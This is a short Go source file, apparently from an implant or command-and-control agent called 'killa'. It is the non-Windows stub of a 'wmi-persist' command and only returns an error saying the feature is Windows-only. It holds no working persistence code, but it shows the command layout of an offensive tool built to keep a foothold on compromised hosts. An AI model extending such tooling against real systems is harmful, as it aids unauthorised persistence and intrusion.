//go:build !windows
// +build !windows

package commands

import "killa/pkg/structs"

func (c *WmiPersistCommand) Execute(task structs.Task) structs.CommandResult {
	args, errResult := parseWmiPersistArgs(task)
	if errResult != nil {
		return *errResult
	}
	_ = args
	return structs.CommandResult{
		Output:    "wmi-persist is only available on Windows",
		Status:    "error",
		Completed: true,
	}
}
